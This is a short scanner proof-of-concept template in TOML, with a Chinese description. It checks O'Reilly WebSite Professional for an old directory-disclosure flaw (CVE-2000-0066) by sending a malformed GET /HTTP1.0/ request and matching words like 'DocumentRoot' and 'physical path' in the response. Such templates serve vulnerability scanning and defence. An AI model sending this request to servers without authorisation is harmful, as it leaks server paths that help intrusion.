[info]
author = "ave"
description = "向 WebSite Pro 服务器发送畸形 HTTP 请求 GET /HTTP1.0/，服务器返回的响应中可能包含 Web 目录的物理路径信息，用于验证目录泄露漏洞"
id = "POC-AVE-2000-0052"
name = "O'Reilly WebSite Professional 目录泄露 PoC"
severity = "medium"
tags = ["ave-2000-0052"]
vuln_id = [
    "CVE-2000-0066",
    "AVE-2000-0052",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/HTTP1.0/"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Server:",
    "DocumentRoot",
    "physical path",
    "real path",
    "directory",
]
